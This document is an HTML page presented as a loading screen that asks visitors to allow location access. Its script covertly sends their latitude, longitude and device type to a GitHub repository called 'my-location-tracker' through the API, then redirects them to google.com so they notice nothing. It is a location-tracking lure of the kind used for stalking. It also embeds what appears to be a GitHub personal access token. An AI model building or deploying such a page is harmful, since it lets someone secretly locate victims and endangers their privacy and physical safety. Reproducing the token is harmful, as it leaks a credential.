<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <p>Please allow location access to continue...</p>

    <script>
        // CONFIGURATION: Username and Repository are fully updated!
        const GITHUB_USERNAME = "morgansmithgacha-alt"; 
        const REPO_NAME = "my-location-tracker";
        
        // IMPORTANT: Paste your brand new secret fine-grained token between the quotes below
        const GITHUB_TOKEN = "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";

        function sendToGitHub(lat, lon, os) {
            // This tells the browser exactly where to send the data on GitHub's API
            const url = `https://github.com{GITHUB_USERNAME}/${REPO_NAME}/dispatches`;
            
            const payload = {
                event_type: "location_update",
                client_payload: {
                    timestamp: new Date().toISOString(),
                    latitude: lat,
                    longitude: lon,
                    device: os
                }
            };

            fetch(url, {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${GITHUB_TOKEN}`,
                    "Accept": "application/vnd.github+json",
                    "X-GitHub-Api-Version": "2022-11-28"
                },
                body: JSON.stringify(payload)
            })
            .then(() => {
                // Redirects to a real website after successful delivery
                window.location.href = "https://google.com";
            })
            .catch(err => console.error("Error sending webhook:", err));
        }

        function getOS() {
            const userAgent = window.navigator.userAgent;
            if (userAgent.indexOf("Win") !== -1) return "Windows";
            if (userAgent.indexOf("Mac") !== -1) return "macOS";
            if (userAgent.indexOf("Android") !== -1) return "Android";
            if (userAgent.indexOf("like Mac") !== -1) return "iOS/iPhone";
            return "Unknown Device";
        }

        // Prompt the user for location access
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const os = getOS();
                    sendToGitHub(lat, lon, os);
                },
                (error) => {
                    alert("Location access is required to view this page.");
                }
            );
        } else {
            alert("Your browser does not support tracking.");
        }
    </script>
</body>
</html>
